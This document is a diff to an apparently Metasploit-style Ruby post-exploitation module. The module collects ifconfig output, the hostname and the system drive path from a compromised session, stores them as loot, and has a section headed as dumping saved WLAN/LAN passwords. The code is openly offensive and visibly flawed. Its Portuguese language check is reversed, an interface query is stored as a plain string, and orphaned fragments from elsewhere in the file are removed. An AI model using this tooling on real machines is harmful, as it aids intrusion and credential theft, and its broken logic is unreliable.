@@ -11,11 +11,26 @@
 #
 OptBool.new('STORE_LOOT', [false, 'Store file in loot (will simply output file to console if set to false).', true]),
 
-  if datastore['STORE_LOOT'] == true
-    data_entry = cmd_exec("ifconfig")
-    store_loot("ifconfig", "text/plain", session, data_entry, "output.txt", "output of ifconfig command")
-  end
+if datastore['STORE_LOOT'] == true
+  data_entry = cmd_exec("ifconfig")
+  store_loot("ifconfig", "text/plain", session, data_entry, "output.txt", "output of ifconfig command")
+end
 
+
+
+
+#
+# display report note to attacker???
+#
+output = client.fs.file.expand_path("%SYSTEMDRIVE%")
+
+report_note(
+  :host_name => session,
+  :type      => "windows.system.path",
+  :data      => output,
+  :update    => :unique_data
+  )
+print_status("System info gather ..")
 
 
 
@@ -84,6 +99,21 @@ print_line("CONFIGS: #{command_output}")
 if exists_exe?("wget")
   print_good("wget available, using it")
 end
+
+
+
+# Get host name
+  def get_host
+    case session.type
+    when /meterpreter/
+      host = sysinfo["Computer"]
+    when /shell/
+      host = cmd_exec("hostname").chomp
+    end
+
+    print_status("Running module against #{host}")
+    return host
+  end
 
 
 
@@ -426,26 +456,6 @@ end
 
 
 #
-# display report note to attacker???
-#
-hpat = client.fs.file.expand_path("%HOMEPATH%")
-syhd = client.fs.file.expand_path("%SYSTEMDRIVE%")
-
-      report_note(
-        :host   => session,
-        :home   => #{hpat},
-        :system => #{syhd},
-        :update => :unique_data
-        )
-      print_status("This is a Sun VirtualBox Virtual Machine")
-      return "VirtualBox"
-    end
-  end
-
-
-
-
-#
 # DUMP PASSWORD FROM SELECTED ESSID WLAN/LAN
 #
 def ls_stage3
@@ -455,9 +465,9 @@ def ls_stage3
   lang = client.sys.config.sysinfo["System Language"]
 
     if lang =~ /pt/
-      lag = key
+      lag = "key"
     else
-      lag = Chave
+      lag = "Chave"
     end
 
     r=''
@@ -488,9 +498,8 @@ end
 # system along with the details like IP, netmask, mac_address etc
 #
 vtemp = "client.net.config.get_interfaces"
-
 # display variable to user
-print_good(" #{vtemp}")
+print_good("Interfaces: #{vtemp}")
 
 
 
